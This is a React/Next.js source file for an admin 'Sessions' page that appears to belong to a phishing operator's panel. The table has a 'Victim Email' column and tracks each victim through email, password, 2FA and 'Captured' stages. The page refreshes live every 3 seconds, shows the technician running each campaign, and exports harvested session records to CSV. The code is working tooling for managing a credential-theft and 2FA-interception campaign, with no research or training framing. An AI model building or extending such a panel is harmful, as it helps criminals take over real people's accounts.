'use client';

import { useState, useEffect } from 'react';
import Link from 'next/link';
import { Download, Eye, Clock, Activity, Filter, ArrowLeft, Trash2 } from 'lucide-react';
import { formatDistanceToNow } from 'date-fns';
import { toast } from 'sonner';

interface Session {
  id: string;
  email: string | null;
  campaignName: string;
  campaignId: string;
  technicianEmail: string | null;
  stage: string;
  status: string;
  launched: boolean;
  createdAt?: string;
  startedAt?: string;
  updatedAt?: string;
}

export default function SessionsPage() {
  const [sessions, setSessions] = useState<Session[]>([]);
  const [loading, setLoading] = useState(true);
  const [filter, setFilter] = useState<'all' | 'active' | 'captured' | 'failed'>('all');
  const [lastUpdated, setLastUpdated] = useState('');
  const [selected, setSelected] = useState<Set<string>>(new Set());
  const [confirmDelete, setConfirmDelete] = useState<{ type: 'single' | 'bulk'; id?: string; count?: number } | null>(null);

  useEffect(() => {
    fetchSessions();
    const interval = setInterval(() => {
      fetchSessions();
      updateLastUpdated();
    }, 3000);
    return () => clearInterval(interval);
  }, [filter]);

  const fetchSessions = async () => {
    try {
      let url = `${process.env.NEXT_PUBLIC_API_URL || 'https://api.fioona.org'}/api/admin/sessions`;
      if (filter !== 'all') {
        url += `?status=${filter}`;
      }
      const token = localStorage.getItem('token');
      const response = await fetch(url, {
        headers: {
          'Content-Type': 'application/json',
          ...(token ? { Authorization: `Bearer ${token}` } : {}),
        },
      });
      const data = await response.json();
      if (data.success) {
        setSessions(data.sessions || []);
      }
    } catch (error: any) {
      console.error('Failed to fetch sessions:', error);
      toast.error(error.response?.data?.error || 'Failed to load sessions');
    } finally {
      setLoading(false);
    }
  };

  const updateLastUpdated = () => {
    const now = new Date();
    const hours = now.getUTCHours().toString().padStart(2, '0');
    const minutes = now.getUTCMinutes().toString().padStart(2, '0');
    const seconds = now.getUTCSeconds().toString().padStart(2, '0');
    setLastUpdated(`${hours}:${minutes}:${seconds} UTC`);
  };

  const toggleSelect = (id: string) => {
    setSelected(prev => {
      const next = new Set(prev);
      next.has(id) ? next.delete(id) : next.add(id);
      return next;
    });
  };

  const toggleSelectAll = () => {
    if (selected.size === sessions.length) {
      setSelected(new Set());
    } else {
      setSelected(new Set(sessions.map(s => s.id)));
    }
  };

  const handleDelete = (id: string) => {
    setConfirmDelete({ type: 'single', id });
  };

  const handleBulkDelete = () => {
    setConfirmDelete({ type: 'bulk', count: selected.size });
  };

  const confirmDeleteAction = async () => {
    if (!confirmDelete) return;

    try {
      const token = localStorage.getItem('token');

      if (confirmDelete.type === 'single' && confirmDelete.id) {
        const response = await fetch(`${process.env.NEXT_PUBLIC_API_URL || 'https://api.fioona.org'}/api/admin/sessions/${confirmDelete.id}`, {
          method: 'DELETE',
          headers: { Authorization: `Bearer ${token}` },
        });
        
        const data = await response.json();
        
        if (!response.ok || !data.success) {
          throw new Error(data.error || 'Failed to delete session');
        }
        
        toast.success('Session deleted from database');
        setSelected(prev => { const n = new Set(prev); n.delete(confirmDelete.id!); return n; });
      } else if (confirmDelete.type === 'bulk') {
        const response = await fetch(`${process.env.NEXT_PUBLIC_API_URL || 'https://api.fioona.org'}/api/admin/sessions`, {
          method: 'DELETE',
          headers: { 'Content-Type': 'application/json', Authorization: `Bearer ${token}` },
          body: JSON.stringify({ ids: Array.from(selected) }),
        });
        
        const data = await response.json();
        
        if (!response.ok || !data.success) {
          throw new Error(data.error || 'Failed to delete sessions');
        }
        
        toast.success(`${selected.size} sessions permanently deleted`);
        setSelected(new Set());
      }

      await fetchSessions();
    } catch (error: any) {
      console.error('Delete error:', error);
      toast.error(error.message || 'Failed to delete sessions');
    } finally {
      setConfirmDelete(null);
    }
  };

  const handleExport = () => {
    try {
      if (sessions.length === 0) {
        toast.error('No sessions to export');
        return;
      }

      // Create CSV content
      const headers = ['ID', 'Email', 'Campaign', 'Stage', 'Status', 'Technician', 'Created At', 'Updated At'];
      const csvRows = [headers.join(',')];

      sessions.forEach(session => {
        const row = [
          session.id,
          session.email || 'N/A',
          session.campaignName || 'N/A',
          session.stage,
          session.status,
          session.technicianEmail || 'N/A',
          session.createdAt || session.startedAt ? new Date(session.createdAt || session.startedAt!).toISOString() : 'N/A',
          session.updatedAt ? new Date(session.updatedAt).toISOString() : 'N/A'
        ];
        // Escape commas and quotes in values
        const escapedRow = row.map(val => {
          const str = String(val);
          if (str.includes(',') || str.includes('"') || str.includes('\n')) {
            return `"${str.replace(/"/g, '""')}"`;
          }
          return str;
        });
        csvRows.push(escapedRow.join(','));
      });

      const csvContent = csvRows.join('\n');
      
      // Create and download file
      const blob = new Blob([csvContent], { type: 'text/csv;charset=utf-8;' });
      const link = document.createElement('a');
      const url = URL.createObjectURL(blob);
      link.setAttribute('href', url);
      link.setAttribute('download', `sessions-export-${new Date().toISOString().split('T')[0]}.csv`);
      link.style.visibility = 'hidden';
      document.body.appendChild(link);
      link.click();
      document.body.removeChild(link);
      
      toast.success(`Exported ${sessions.length} sessions to CSV`);
    } catch (error: any) {
      console.error('Failed to export sessions:', error);
      toast.error('Failed to export sessions');
    }
  };

  const getDuration = (dateStr?: string) => {
    if (!dateStr) return '—';
    const d = new Date(dateStr);
    if (isNaN(d.getTime())) return '—';
    const seconds = Math.floor((new Date().getTime() - d.getTime()) / 1000);
    const mins = Math.floor(seconds / 60);
    const hours = Math.floor(mins / 60);
    const days = Math.floor(hours / 24);
    if (days > 0) return `${days}d ago`;
    if (hours > 0) return `${hours}h ${mins % 60}m ago`;
    if (mins > 0) return `${mins}m ${seconds % 60}s`;
    return `${seconds}s`;
  };

  const extractDomain = (url: string) => {
    try {
      return new URL(url).hostname;
    } catch {
      return url;
    }
  };

  const activeSessions = sessions.filter(s => s.launched === true).length;
  const capturedSessions = sessions.filter(s => s.status === 'COMPLETED').length;
  const failedSessions   = sessions.filter(s => s.status === 'FAILED').length;

  return (
    <div className="mx-auto max-w-7xl p-8 space-y-6">
      {/* Header */}
      <div className="flex items-center justify-between">
        <div>
          {/* Back Link */}
          <Link href="/admin" className="flex items-center gap-1.5 text-sm text-white/60 hover:text-white transition-colors mb-3">
            <ArrowLeft className="h-3.5 w-3.5" />
            Back
          </Link>
          {/* Breadcrumb */}
          <div className="mb-2 text-sm text-white/50">
            <Link href="/admin" className="hover:text-white/70 transition-colors cursor-pointer">Admin</Link>
            <span> / </span>
            <span>Sessions</span>
          </div>
          <h1 className="text-2xl font-semibold text-white">Sessions</h1>
          <p className="text-sm text-white/50 mt-1">
            Monitor all active and historical sessions
          </p>
        </div>
        <div className="flex items-center gap-3">
          {lastUpdated && (
            <div className="flex items-center gap-2">
              <Clock className="h-4 w-4 text-white/30" />
              <span className="text-xs font-mono text-white/40">
                {lastUpdated}
              </span>
            </div>
          )}
          <button
            onClick={handleExport}
            className="flex items-center gap-2 px-4 py-2 bg-white/5 hover:bg-white/10 border border-white/10 text-white rounded-lg text-sm font-medium transition-colors"
          >
            <Download className="h-4 w-4" />
            Export
          </button>
        </div>
      </div>

      {/* Stats Row */}
      <div className="grid gap-4 md:grid-cols-4">
        <div className="rounded-xl border border-white/10 bg-[#151823] p-6">
          <div className="text-2xl font-semibold text-white">{sessions.length}</div>
          <div className="text-sm text-white/50 mt-1">Total Sessions</div>
        </div>
        <div className="rounded-xl border border-white/10 bg-[#151823] p-6">
          <div className="text-2xl font-semibold text-[#10B981]">{activeSessions}</div>
          <div className="text-sm text-white/50 mt-1">Active</div>
        </div>
        <div className="rounded-xl border border-white/10 bg-[#151823] p-6">
          <div className="text-2xl font-semibold text-[#4F7FFF]">{capturedSessions}</div>
          <div className="text-sm text-white/50 mt-1">Captured</div>
        </div>
        <div className="rounded-xl border border-white/10 bg-[#151823] p-6">
          <div className="text-2xl font-semibold text-[#EF4444]">{failedSessions}</div>
          <div className="text-sm text-white/50 mt-1">Failed</div>
        </div>
      </div>

      {/* Filter Tabs */}
      <div className="flex items-center gap-3">
        <Filter className="h-4 w-4 text-white/50" />
        <div className="flex gap-2">
          {(['all', 'active', 'captured', 'failed'] as const).map((f) => (
            <button
              key={f}
              onClick={() => setFilter(f)}
              className={`px-3 py-1.5 text-xs font-medium rounded-lg transition-colors capitalize ${
                filter === f
                  ? 'bg-[#4F7FFF]/10 text-[#4F7FFF] border border-[#4F7FFF]/20'
                  : 'bg-transparent text-white/50 hover:text-white/70'
              }`}
            >
              {f}
            </button>
          ))}
        </div>
      </div>

      {/* Bulk Action Bar */}
      {selected.size > 0 && (
        <div className="flex items-center justify-between px-4 py-2.5 rounded-lg bg-[#EF4444]/10 border border-[#EF4444]/20">
          <span className="text-sm text-[#EF4444] font-medium">{selected.size} session{selected.size > 1 ? 's' : ''} selected</span>
          <div className="flex items-center gap-2">
            <button
              onClick={() => setSelected(new Set())}
              className="text-xs text-white/50 hover:text-white px-3 py-1.5 rounded-lg transition-colors"
            >
              Clear
            </button>
            <button
              onClick={handleBulkDelete}
              className="flex items-center gap-1.5 px-3 py-1.5 bg-[#EF4444]/20 hover:bg-[#EF4444]/30 text-[#EF4444] rounded-lg text-xs font-medium transition-colors"
            >
              <Trash2 className="h-3.5 w-3.5" />
              Delete Selected
            </button>
          </div>
        </div>
      )}

      {/* Sessions Table */}
      <div className="rounded-xl border border-white/10 bg-[#151823] overflow-hidden">
        {loading ? (
          <div className="p-12 flex items-center justify-center">
            <div className="h-8 w-8 border-2 border-[#4F7FFF] border-t-transparent rounded-full animate-spin"></div>
          </div>
        ) : sessions.length === 0 ? (
          <div className="p-12 text-center">
            <Eye className="h-16 w-16 mx-auto mb-4 text-white/20" />
            <h3 className="text-lg font-medium text-white mb-2">No sessions found</h3>
            <p className="text-sm text-white/50">
              Sessions will appear when technicians run campaigns
            </p>
          </div>
        ) : (
          <table className="w-full">
            <thead className="bg-white/5">
              <tr>
                <th className="px-4 py-3 w-10">
                  <input
                    type="checkbox"
                    checked={sessions.length > 0 && selected.size === sessions.length}
                    onChange={toggleSelectAll}
                    className="rounded border-white/20 bg-white/5 cursor-pointer"
                  />
                </th>
                <th className="text-left px-6 py-3 text-xs font-medium text-white/50 uppercase tracking-wider">Victim Email</th>
                <th className="text-left px-6 py-3 text-xs font-medium text-white/50 uppercase tracking-wider">Campaign</th>
                <th className="text-left px-6 py-3 text-xs font-medium text-white/50 uppercase tracking-wider">Stage</th>
                <th className="text-center px-6 py-3 text-xs font-medium text-white/50 uppercase tracking-wider">Status</th>
                <th className="text-left px-6 py-3 text-xs font-medium text-white/50 uppercase tracking-wider">Technician</th>
                <th className="text-left px-6 py-3 text-xs font-medium text-white/50 uppercase tracking-wider">Age</th>
                <th className="px-6 py-3 w-12"></th>
              </tr>
            </thead>
            <tbody className="divide-y divide-white/10">
              {sessions.map((session) => (
                <tr key={session.id} className="hover:bg-white/5 transition-colors">
                  <td className="px-4 py-4">
                    <input
                      type="checkbox"
                      checked={selected.has(session.id)}
                      onChange={() => toggleSelect(session.id)}
                      className="rounded border-white/20 bg-white/5 cursor-pointer"
                    />
                  </td>
                  <td className="px-6 py-4">
                    <span className="font-mono text-sm text-white">{session.email ?? '—'}</span>
                  </td>
                  <td className="px-6 py-4">
                    <span className="text-sm text-white">{session.campaignName}</span>
                  </td>
                  <td className="px-6 py-4">
                    <span className="text-xs font-mono text-white/70">
                      {session.stage === 'EMAIL_ENTERED'    ? 'Email entered'
                       : session.stage === 'PASSWORD_ENTERED' ? 'Password entered'
                       : session.stage === 'TWO_FA_REQUIRED'  ? '2FA required'
                       : session.stage === 'COMPLETED'         ? 'Completed'
                       : session.stage}
                    </span>
                  </td>
                  <td className="px-6 py-4 text-center">
                    {session.launched === true ? (
                      <div className="flex items-center gap-2">
                        <div className="w-2 h-2 rounded-full bg-[#F97316] animate-pulse"></div>
                        <span className="text-xs text-[#F97316] font-medium">Active</span>
                      </div>
                    ) : session.status === 'COMPLETED' ? (
                      <div className="flex items-center gap-2">
                        <div className="w-2 h-2 rounded-full bg-[#4F7FFF]"></div>
                        <span className="text-xs text-[#4F7FFF] font-medium">Captured</span>
                      </div>
                    ) : session.status === 'PASSWORD_ENTERED' ? (
                      <div className="flex items-center gap-2">
                        <div className="w-2 h-2 rounded-full bg-[#F59E0B]"></div>
                        <span className="text-xs text-[#F59E0B] font-medium">Credentials</span>
                      </div>
                    ) : session.status === 'EMAIL_ENTERED' ? (
                      <div className="flex items-center gap-2">
                        <div className="w-2 h-2 rounded-full bg-[#6366F1]"></div>
                        <span className="text-xs text-[#6366F1] font-medium">Email Only</span>
                      </div>
                    ) : session.status === 'FAILED' || session.status === 'EXPIRED' ? (
                      <div className="flex items-center gap-2">
                        <div className="w-2 h-2 rounded-full bg-[#EF4444]"></div>
                        <span className="text-xs text-[#EF4444] font-medium">Failed</span>
                      </div>
                    ) : (
                      <div className="flex items-center gap-2">
                        <div className="w-2 h-2 rounded-full bg-white/30"></div>
                        <span className="text-xs text-white/40 font-medium">{session.status}</span>
                      </div>
                    )}
                  </td>
                  <td className="px-6 py-4">
                    <span className="text-sm text-white/50">{session.technicianEmail ?? '—'}</span>
                  </td>
                  <td className="px-6 py-4">
                    <span className="text-sm text-white/50">
                      {session.createdAt || session.startedAt 
                        ? formatDistanceToNow(new Date(session.createdAt || session.startedAt!), { addSuffix: true })
                        : '—'}
                    </span>
                  </td>
                  <td className="px-4 py-4">
                    <button
                      onClick={() => handleDelete(session.id)}
                      className="p-1.5 rounded-lg text-white/30 hover:text-[#EF4444] hover:bg-[#EF4444]/10 transition-colors"
                      title="Delete session"
                    >
                      <Trash2 className="h-4 w-4" />
                    </button>
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        )}
      </div>

      {/* Info Card */}
      <div className="rounded-xl border border-[#10B981]/20 bg-[#10B981]/10 p-4">
        <div className="flex gap-3">
          <Activity className="h-5 w-5 text-[#10B981] flex-shrink-0 mt-0.5" />
          <div className="text-sm text-white/70 space-y-1">
            <p className="font-medium text-white">Live Session Monitoring</p>
            <p className="text-white/60">
              This table auto-refreshes every 3 seconds. Active sessions show real-time progress through email → password → 2FA → capture stages.
            </p>
          </div>
        </div>
      </div>

      {/* Delete Confirmation Modal */}
      {confirmDelete && (
        <div className="fixed inset-0 bg-black/60 backdrop-blur-sm flex items-center justify-center z-50" onClick={() => setConfirmDelete(null)}>
          <div className="bg-[#1A1D2E] border border-white/10 rounded-xl p-6 max-w-md w-full mx-4 shadow-2xl" onClick={(e) => e.stopPropagation()}>
            <div className="flex items-start gap-4">
              <div className="flex-shrink-0 w-12 h-12 rounded-full bg-[#EF4444]/10 border border-[#EF4444]/20 flex items-center justify-center">
                <Trash2 className="h-6 w-6 text-[#EF4444]" />
              </div>
              <div className="flex-1">
                <h3 className="text-lg font-semibold text-white mb-2">Delete {confirmDelete.type === 'bulk' ? 'Sessions' : 'Session'}?</h3>
                <p className="text-sm text-white/60 mb-4">
                  {confirmDelete.type === 'bulk' 
                    ? `Are you sure you want to permanently delete ${confirmDelete.count} selected sessions? This will remove all data from the database.`
                    : 'Are you sure you want to permanently delete this session? This will remove all data from the database.'}
                </p>
                <p className="text-xs text-[#EF4444] font-medium mb-6">⚠️ This action cannot be undone.</p>
                <div className="flex gap-3">
                  <button
                    onClick={() => setConfirmDelete(null)}
                    className="flex-1 px-4 py-2.5 bg-white/5 hover:bg-white/10 border border-white/10 text-white rounded-lg text-sm font-medium transition-colors"
                  >
                    Cancel
                  </button>
                  <button
                    onClick={confirmDeleteAction}
                    className="flex-1 px-4 py-2.5 bg-[#EF4444] hover:bg-[#DC2626] text-white rounded-lg text-sm font-medium transition-colors"
                  >
                    Delete {confirmDelete.type === 'bulk' ? 'All' : ''}
                  </button>
                </div>
              </div>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
